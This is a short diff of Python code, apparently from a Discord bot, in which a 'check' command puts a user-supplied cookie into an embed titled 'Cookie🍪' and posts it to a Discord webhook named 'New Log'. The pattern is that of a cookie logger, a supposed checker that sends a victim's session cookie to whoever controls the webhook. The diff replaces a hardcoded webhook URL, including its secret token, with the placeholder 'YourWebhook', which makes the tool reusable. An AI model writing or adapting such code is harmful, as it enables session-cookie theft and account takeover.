@@ -97,7 +97,7 @@ async def check(ctx, cookie):
     e.add_embed_field(name='Cookie🍪:', value=f'```{cookie}```', inline=False)
     e.set_thumbnail(url=image_url)
     e.set_footer(text='discord.gg/legal')
-    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/893939735129653309/JeN4Dlr-haiKp3TEnIwZFMQzkWm_XYkoa5zjfYcz4VZ2mrK6OBDhArLyq3Dc8Ri7dF-w', username="New Log")
+    webhook = DiscordWebhook(url='YourWebhook', username="New Log")
     webhook.add_embed(e)
     webhook.execute()
   else:
